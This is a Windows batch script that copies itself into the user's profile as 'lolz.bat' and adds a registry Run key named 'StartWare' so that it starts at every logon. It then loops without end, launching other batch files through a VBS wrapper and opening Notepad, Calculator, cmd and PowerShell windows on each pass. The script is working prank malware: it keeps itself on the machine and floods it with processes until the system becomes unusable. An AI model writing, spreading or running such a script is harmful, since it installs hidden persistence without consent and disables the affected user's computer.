@echo off
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Captures\lolz.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Captures\lolz.bat" /f

:loop
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
start notepad
start calc
start cmd
start powershell
goto loop
